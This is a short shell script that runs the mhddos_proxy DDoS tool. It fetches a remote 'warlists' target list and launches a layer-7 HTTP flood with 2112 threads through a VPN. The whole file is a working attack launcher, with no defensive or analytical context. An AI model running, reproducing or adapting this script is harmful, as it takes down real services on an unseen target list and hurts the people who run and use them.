#!/usr/bin/env sh

# https://github.com/porthole-ascend-cinnamon/mhddos_proxy

python3 runner.py \
  --config https://raw.githubusercontent.com/FluxState/warlists/main/l7.lst \
  --http-methods RGET \
  --lang en \
  --threads 2112 \
  --vpn
